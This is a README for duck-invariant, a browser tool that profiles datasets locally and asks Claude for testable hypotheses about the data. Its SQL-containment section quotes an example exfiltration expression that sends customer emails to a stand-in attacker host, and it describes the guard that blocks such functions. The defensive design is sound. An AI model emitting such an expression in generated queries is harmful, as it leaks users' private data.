# duck-invariant

Point it at a dataset, and it proposes **falsifiable hypotheses** about the data — then tests
each one locally and tells you which ones are false.

Everything runs in the browser. DuckDB-WASM loads the file, profiles every column, and evaluates
every check. The only thing that ever leaves the page is a statistical profile: counts,
percentages, ranges, and masked format shapes. **No cell values are ever transmitted.**

```
URL or file → validate → load into DuckDB → profile → ask Claude for hypotheses → test locally
```

## Quick start

```bash
npm install
cp .dev.vars.example .dev.vars     # add your Anthropic API key
npm run dev                        # next on :3000, worker on :8787
```

Open http://localhost:3000, paste a CORS-enabled Parquet/CSV/JSON URL (there is a sample link in
the UI), or choose a local file.

## How the privacy guarantee works

The model is asked to reason about your data without seeing it, so the profile is the entire
channel. What crosses the network:

| Sent | Not sent |
|---|---|
| Column names and DuckDB type names | Any cell value |
| Row/null/distinct counts, percentages | String min/max, top-k values, row samples |
| Numeric min/max/quantiles, date ranges | Anything not declared in `TableProfileSchema` |
| String length + character-class distributions | |
| Masked shapes: `aaron.blake@acme.io` → `a{5}.a{5}@a{4}.aa` | |

Enforced in three places:

1. `lib/profile/redaction.ts` — `assertNoValues()` re-parses the profile through its zod schema
   (dropping unknown keys) and rejects any shape containing an unmasked letter or digit. A profile
   cannot reach the network without passing it.
2. `worker/index.ts` — re-parses the incoming profile server-side, so a modified client cannot
   smuggle extra fields through to Anthropic.
3. `test/profile.test.ts` and `test/integration.test.ts` — profile fixtures seeded with realistic
   PII and real TPC-H data, then assert none of those literals appear in the serialised profile.

The UI's **"what gets sent"** toggle shows the exact request body, so you never have to take the
above on trust.

## How generated SQL is contained

Claude writes checks that run against your data, so a generated expression like
`read_csv('https://evil.example/?leak=' || customer_email)` would defeat the whole point. Two
independent layers stop it:

- **The model never emits raw SQL.** It emits a structured check — a boolean row predicate or a
  uniqueness claim — and we build the query around it, so the `FROM` clause is always ours and the
  result is always a count. `lib/hypotheses/guard.ts` then rejects any expression containing
  `SELECT`, a semicolon, a comment marker, or a function that can reach a file or URL. Banning
  `SELECT` removes subquery exfiltration entirely; a row predicate never needs one.
- **DuckDB has the capability taken away.** The file is materialised into a table, then
  `SET enable_external_access=false` runs before any generated SQL. `test/integration.test.ts`
  proves this by asserting a remote read actually fails afterwards.

Trade-off: materialising means the file is held in browser memory rather than range-read lazily,
so very large files are slow. The UI warns above 500 MB.

## Layout

```
app/                    one page, client-side
components/             checklist, profile panel, hypothesis list, violation table
lib/sources/validate.ts URL preflight: CORS, ranges, size, magic-byte format sniffing
lib/duckdb/             bundles (swappable CDN → R2), client, loader + lockdown
lib/profile/            SQL builders, orchestration, shape masking, redaction
lib/hypotheses/         shared schema, expression guard, local evaluation
worker/                 Hono: /api/health, /api/hypotheses  — the only server code
```

`lib/duckdb/bundles.ts` is the only file that knows where the WebAssembly comes from. It cannot
ship in Cloudflare's static assets — `duckdb-eh.wasm` is 34 MiB against a 25 MiB per-file limit —
so it loads from jsDelivr. To self-host, upload the bundle to R2 and set
`NEXT_PUBLIC_DUCKDB_BASE_URL`; nothing else changes.

## Deploy

```bash
npx wrangler login
npx wrangler secret put ANTHROPIC_API_KEY
npm run deploy
```

Then protect it: Cloudflare dashboard → Workers & Pages → duck-invariant → **Access** tab →
"Protect this Worker behind Access". This works on the `workers.dev` hostname with no custom
domain. Without it, anyone who finds the URL can spend your API key.

Note: Worker-level Access policies do not support WebSockets, which is one reason this app uses a
single request/response rather than a streaming socket.

## One query, one response — and you can read both

Each run makes exactly **one** request to Claude and gets **one** response. There is no agent
loop, no tool use, and no retry-with-follow-up: the model is asked once for structured output and
that is the entire exchange. No tools are declared in the request, so the model has no mechanism
to ask for another turn even if it wanted one.

That is measured rather than asserted. `worker/index.ts` wraps `fetch` in a counter and reports
`httpAttempts` on every response, so the number shown in the UI is the real one. If it ever reads
above 1, the SDK resent the same query after a transient failure — the UI says so explicitly
rather than letting it look like an extra question. `test/exchange.test.ts` drives the Worker with
a recording client and asserts one request, one user message, and no `tools` field.

The **Transcript** panel shows the exchange verbatim: the system prompt, the user message, and the
model's raw structured output, plus model, token counts, latency and stop reason. Those strings
are the ones actually sent — recorded in the Worker at the point of the call, not reconstructed
afterwards, since a reconstruction would defeat the point of showing them.

## Results appear as they are tested

Hypotheses render the moment the model replies, each marked `queued`, then `testing…`, then its
verdict, with an `n of m tested` counter. Checks run over a pool of DuckDB connections
(`evaluateAllHypotheses`) so several are in flight at once and each verdict lands as soon as it is
ready, instead of the page sitting still until the slowest one finishes.

An honest caveat: the `eh` WebAssembly build is single-threaded, so this is not true CPU
parallelism — DuckDB still executes one query at a time. What the pool actually buys is that
queries queue inside the worker rather than each waiting for a JS round trip, and that results
stream. If the threaded build is ever enabled it becomes real parallelism with no code change.

## Keeping it off search engines and AI crawlers

Four layers, in descending order of how much they are actually worth:

1. **Cloudflare Access — the only one that enforces anything.** A crawler cannot authenticate, so
   it gets the login redirect instead of your page. Everything below is a request that a
   well-behaved crawler chooses to honour; Access is the part that does not depend on goodwill.
2. **`preview_urls: false`** in `wrangler.jsonc`. Preview URLs publish an extra hostname
   (`<version>-duck-invariant.<subdomain>.workers.dev`) that an Access policy scoped to the
   production host would not cover.
3. **`X-Robots-Tag: noindex, nofollow, noarchive, nosnippet`** on every response. Asset responses
   get it from `public/_headers`; Worker responses get it from middleware in `worker/index.ts`,
   because `_headers` does not apply to them. Unlike robots.txt this also tells a crawler that
   *already has* the URL not to index it.
4. **`robots.txt` and robots meta tags.** Generated by `app/robots.ts` from the list in
   `lib/crawlers.ts`: a blanket `User-agent: *` plus ~50 named crawlers. The names matter because
   `Google-Extended` and `Applebot-Extended` are not crawlers at all — they are AI-training
   opt-out tokens that only take effect when addressed by name, and are ignored under the
   wildcard.

`Referrer-Policy: no-referrer` is also set. That one is not about crawlers: the app fetches
data URLs you supply, and without it the `Referer` header would hand this site's address to
every host you point it at — which is exactly how a private URL stops being private.

The remaining exposure is a link. Crawlers find URLs mostly by following them, so pasting the
address into a public issue, a shared doc, or a chat that indexes its history will do more to make
it discoverable than any of the above will prevent. Enable Access and the point is moot.

## Model

`claude-sonnet-5`, hardcoded in the Worker along with the system prompt, output schema and token
cap. The client sends only a profile, so the endpoint cannot be repurposed as a general-purpose
Claude proxy. Structured outputs (`messages.parse` + `zodOutputFormat`) guarantee the response
matches the hypothesis schema.

## Tests

```bash
npm test
```

62 tests. The profiling and evaluation tests run against a real DuckDB via the Node build of
duckdb-wasm, so they exercise exactly the SQL the browser runs, and `test/integration.test.ts`
loads a real remote Parquet file end to end.

## Known limits

- Single table per session; no joins across sources yet.
- Large files are held in memory (see the trade-off above).
- Single-threaded DuckDB — the threaded build needs site-wide cross-origin isolation.
- Hypotheses that fail to parse are reported as "not run" rather than repaired.
- Concurrency is bounded by the single-threaded WebAssembly build (see above).
